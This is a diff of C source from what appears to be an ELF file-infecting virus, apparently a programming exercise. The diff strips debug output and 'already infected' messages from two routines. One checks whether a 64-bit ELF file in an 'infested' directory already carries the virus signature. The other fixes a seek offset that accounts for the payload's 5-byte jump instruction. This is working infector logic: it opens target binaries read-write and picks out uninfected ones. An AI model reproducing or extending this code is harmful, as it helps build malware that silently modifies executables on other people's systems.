@@ -6,18 +6,12 @@ int FORCE_INLINE signature_present(int fd)
 {
 	char signature[] = SIGNATURE;
 	char buffer[sizeof(signature) - 1];
-	char KO_MSG[] = "already infected\n";
-	char OK_MSG[] = "not infected\n";
 
-	LSEEK(fd, -1 * ((&payload_end + 5) - &payload_start - sizeof(signature) - 1), SEEK_END);
+	// for 5 the size of the jump instruction
+	LSEEK(fd, -1 * ((&payload_end + 5) - &payload_start + (sizeof(signature) - 1)), SEEK_END);
 	READ(fd, &buffer, sizeof(signature) - 1);
-	WRITE(1, buffer, sizeof(buffer));
 	if (!ft_memcmp(buffer, signature, sizeof(signature) - 1))
-	{
-		WRITE(1, KO_MSG, sizeof(KO_MSG));
 		return (1);
-	}
-	WRITE(1, OK_MSG, sizeof(OK_MSG));
 	return (0);
 
 }
@@ -38,22 +32,17 @@ int FORCE_INLINE is_good_format(char *filename)
 	ft_memcpy(buf, infested_dir, sizeof(infested_dir) - 1);
 	ft_memcpy(buf + sizeof(infested_dir) - 1, filename, name_size);
 	buf[name_size + sizeof(infested_dir) - 1] = 0;
-	WRITE(1, buf, ft_strlen(buf));
 	fd = OPEN(buf, O_RDWR);
 	if (fd < 0)
 		return (-1);
 	READ(fd, &header, sizeof(header));
-	WRITE(1, (char*)&header, sizeof(elfmag) - 1);
 	if (ft_memcmp((char*)&header, elfmag, sizeof(elfmag) - 1)
 		|| ((char*)&header)[EI_CLASS] != ELFCLASS64
-		// || header.e_type != ET_EXEC
 		|| signature_present(fd))
 	{
 		CLOSE(fd);
 		return (-1);
 	}
-	// for 5 the size of the jump instruction
-	// verify if not alread infected
 	return (fd);
 }
 
